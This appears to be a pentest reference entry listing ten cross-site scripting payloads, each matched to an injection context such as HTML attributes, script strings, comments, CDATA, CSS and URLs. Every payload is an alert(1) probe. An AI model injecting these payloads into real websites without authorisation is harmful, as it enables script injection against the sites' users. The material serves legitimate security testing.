---
id: "xss-context-payloads"
title: "XSS Payloads - Context-Specific Payloads"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "context", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Payloads optimized for specific injection contexts

## Payloads

### Attribute Break-out

Break out of HTML attribute context

- **Contexts**: attribute
- **Severity**: high

```html
" onmouseover=alert(1) "
```

### JavaScript String Escape

Escape from JavaScript string context

- **Contexts**: script
- **Severity**: high

```html
';alert(1);//
```

### CSS Expression

CSS expression for older IE browsers

- **Contexts**: css
- **Severity**: medium

```html
expression(alert(1))
```

### URL JavaScript Protocol

JavaScript protocol in URL context

- **Contexts**: url
- **Severity**: high

```html
javascript:alert(1)
```

### Comment Break-out

Break out of HTML comment context

- **Contexts**: comment
- **Severity**: medium

```html
--><script>alert(1)</script><!--
```

### JSON Context Escape

Escape from JSON context in script tag

- **Contexts**: script
- **Severity**: high

```html
</script><script>alert(1)</script><script>
```

### CSS Import

CSS import with javascript protocol

- **Contexts**: css
- **Severity**: medium

```html
@import'javascript:alert(1)'
```

### Event Handler in Attribute

Event handler when injected in any attribute

- **Contexts**: attribute
- **Severity**: high

```html
x" autofocus onfocus="alert(1)
```

### CDATA Break-out

Break out of CDATA section in XML/XHTML

- **Contexts**: comment
- **Severity**: medium

```html
]]><script>alert(1)</script><![CDATA[
```

### Meta Refresh XSS

Meta refresh with javascript protocol

- **Contexts**: html
- **Severity**: high

```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```
